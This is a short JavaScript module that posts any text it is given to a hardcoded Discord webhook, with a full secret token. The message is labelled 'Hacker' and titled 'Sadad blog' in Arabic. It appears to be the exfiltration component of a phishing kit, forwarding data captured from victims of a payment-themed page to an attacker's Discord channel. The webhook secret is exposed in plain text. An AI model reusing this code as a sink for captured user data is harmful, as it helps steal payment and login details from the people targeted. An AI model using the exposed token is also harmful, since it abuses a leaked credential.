import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321595331632304211/VkzHXAsoxd4K1TiwWxlNy9-VZxcgoW9Q_dY5zKSWb34HxULYkgl4nUvMkUcO2xEDYVrC",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
